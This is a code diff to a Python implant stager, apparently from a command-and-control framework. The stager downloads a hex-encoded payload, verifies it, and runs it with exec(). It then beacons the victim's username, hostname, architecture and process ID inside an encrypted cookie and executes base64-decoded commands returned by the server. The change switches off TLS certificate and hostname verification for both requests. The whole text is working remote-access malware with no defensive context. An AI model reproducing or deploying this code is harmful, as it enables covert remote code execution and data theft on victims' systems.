@@ -1,4 +1,7 @@
 import urllib2,os,sys,base64,ssl,socket,pwd,hashlib,time
+ctx = ssl.create_default_context()
+ctx.check_hostname = False
+ctx.verify_mode = ssl.CERT_NONE
 kd=time.strptime("#REPLACEKILLDATE#","%d/%m/%Y")
 pyhash="#REPLACEPYTHONHASH#"
 pykey="#REPLACESPYTHONKEY#"
@@ -14,7 +17,7 @@ if sys.version_info[0] == 3 or (sys.version_info[0] == 2 and sys.version_info[1]
     ssl._create_default_https_context=ssl._create_unverified_context
 if hh: r=urllib2.Request(url,headers={'Host':hh,'User-agent':ua})
 else: r=urllib2.Request(url,headers={'User-agent':ua})
-res=urllib2.urlopen(r);d=res.read();c=d[1:];b=c.decode("hex")
+res=urllib2.urlopen(r,context=ctx);d=res.read();c=d[1:];b=c.decode("hex")
 s=hashlib.sha512(b)
 if pykey in b and pyhash == s.hexdigest() and cstr < kd: exec(b)
 else: sys.exit(0)
@@ -24,4 +27,4 @@ hn=socket.gethostname();o=urllib2.build_opener()
 encsid=encrypt(key, '%s;%s;%s;%s;%s;%s' % (un,hn,hn,arch,pid,serverclean))
 if hh:r=urllib2.Request(url2,headers={'Host':hh,'User-agent':ua,'Cookie':'SessionID=%s' % encsid})
 else:r=urllib2.Request(url2,headers={'User-agent':ua,'Cookie':'SessionID=%s' % encsid})
-res=urllib2.urlopen(r);html=res.read();x=decrypt(key, html).rstrip('\0');exec(base64.b64decode(x))
+res=urllib2.urlopen(r,context=ctx);html=res.read();x=decrypt(key, html).rstrip('\0');exec(base64.b64decode(x))
